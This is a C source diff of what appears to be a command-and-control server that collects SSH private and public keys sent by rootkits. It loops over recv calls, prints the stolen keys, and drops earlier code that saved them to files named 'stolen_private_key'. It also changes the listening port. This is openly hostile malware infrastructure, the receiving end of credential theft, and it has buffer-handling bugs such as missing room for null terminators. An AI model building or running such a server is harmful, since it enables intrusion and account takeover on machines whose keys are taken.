@@ -14,59 +14,50 @@
 static const int MAXROOTKITS = 32767; //maximum rootkits allowed in queue
 
 void handle_rootkit(int rootkitSocket) {
-    FILE *fpPrivate;
-    FILE *fpPublic;
+    while (4==4){
 
-    fpPrivate = fopen("stolen_private_key", "w");
-    fpPublic = fopen("stolen_public_key.pub", "w");
+        ssize_t bytesFromClient;
 
-    ssize_t bytesFromClient;
+        //Private Key
+        char sshData[2635]; //Add 1 for null byte, actually 2635+595 + 1
+        int sshSum = 0;
+        int sshDataBufferCount = 0;
 
-    // rootkitMessage rtkMsg;
+        while (sshSum < 2635){
+            char sshDataTempBuffer[4];
+            bytesFromClient = recv(rootkitSocket, sshDataTempBuffer, 4, 0);
+            sshSum += bytesFromClient;
 
-    // bytesFromClient = recv(rootkitSocket, &rtkMsg, 1, 0);
-
-    // printf("Index: %d\n", rtkMsg.index);
-
-    //Private Key
-    char sshData[2636]; //Add 1 for null byte, actually 2635+595 + 1
-    int sshSum = 0;
-    int sshDataBufferCount = 0;
-
-    while (sshSum < 2636){
-        char sshDataTempBuffer[4];
-        bytesFromClient = recv(rootkitSocket, sshDataTempBuffer, 4, 0);
-        sshSum += bytesFromClient;
-
-        for (int t = 0; t < bytesFromClient; t++){
-            sshData[sshDataBufferCount++] = sshDataTempBuffer[t];
+            for (int t = 0; t < bytesFromClient; t++){
+                sshData[sshDataBufferCount++] = sshDataTempBuffer[t];
+            }
         }
-    }
-    sshData[2636] = '\0';
-    printf("%s", sshData);
+        // sshData[2636] = '\0';
+        printf("%s", sshData);
 
-    char random[2];
-    bytesFromClient = recv(rootkitSocket, random, 2, 0);
+        char random[2];
+        bytesFromClient = recv(rootkitSocket, random, 2, 0);
 
-    //Public Key
-    char sshDataPublic[596]; //Add 1 for null byte actually 595 chars
-    int sshSumPublic = 0;
-    int sshDataBufferCountPublic = 0;
+        //Public Key
+        char sshDataPublic[595]; //Add 1 for null byte actually 595 chars
+        int sshSumPublic = 0;
+        int sshDataBufferCountPublic = 0;
 
-    while (sshSumPublic < 596){
+        while (sshSumPublic < 595){
 
-        char sshDataTempBufferPublic[4];
-        bytesFromClient = recv(rootkitSocket, sshDataTempBufferPublic, 4, 0);
-        sshSumPublic += bytesFromClient;
+            char sshDataTempBufferPublic[4];
+            bytesFromClient = recv(rootkitSocket, sshDataTempBufferPublic, 4, 0);
+            sshSumPublic += bytesFromClient;
 
-        for (int t = 0; t < bytesFromClient; t++){
-            sshDataPublic[sshDataBufferCountPublic++] = sshDataTempBufferPublic[t];
+            for (int t = 0; t < bytesFromClient; t++){
+                sshDataPublic[sshDataBufferCountPublic++] = sshDataTempBufferPublic[t];
+            }
         }
+        // sshDataPublic[596] = '\0';
+        printf("%s", sshDataPublic);
+        
+        bytesFromClient = recv(rootkitSocket, random, 2, 0);
     }
-    sshDataPublic[595] = '\0';
-    printf("%s", sshDataPublic);
-    
-    bytesFromClient = recv(rootkitSocket, random, 2, 0);
     
 }
 
@@ -78,7 +69,7 @@ int main(int argc, char *argv[]){
     memset(&cncAddress, 0, sizeof(cncAddress));
     cncAddress.sin_family = AF_INET;
     cncAddress.sin_addr.s_addr = htonl(INADDR_ANY);
-    cncAddress.sin_port = htons(9004);
+    cncAddress.sin_port = htons(9021);
 
     //Create a socket
     int cncSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
